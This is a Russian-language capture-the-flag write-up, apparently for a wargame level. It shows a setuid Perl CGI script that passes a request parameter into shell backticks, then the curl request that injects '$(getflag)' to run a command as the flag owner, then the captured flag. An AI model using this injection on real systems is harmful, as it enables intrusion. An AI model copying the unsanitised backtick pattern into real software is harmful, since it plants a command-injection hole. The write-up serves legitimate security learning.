	ls -la

	-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
	
Итак, у нас есть какой то скрипт на Перле. У него есть права на запуск с повышением привелегий до пользователя, создавшего файл

	vim level04.pl
	
	#!/usr/bin/perl
	# localhost:4747
	use CGI qw{param};
	print "Content-type: text/html\n\n";
	sub x {
		$y = $_[0];
		print `echo $y 2>&1`;
	}
x(param("x"));

Итак, там юзается CGI (https://ru.wikipedia.org/wiki/CGI), а именно qw{param},  получается что мы сверяем занчение, которое подаем с param = "x"
	
Посмотрим, запущен ли у нас какой нибудь веб-сервер

	service --status-all
	[ + ]  apache2

Значит будем пробовать посылать запросы на сервер через curl (http://www.4stud.info/web-programming/cgi.html)(https://ru.hexlet.io/courses/php-mvc/lessons/php-cgi/theory_unit)

	curl localhost:4747/?x='$PATH'

Печатает PATH, работает!

	curl localhost:4747/?x='$(getflag)'

Получаем заветный флаг:

	ne2searoevaevoem4ov4ar8ap
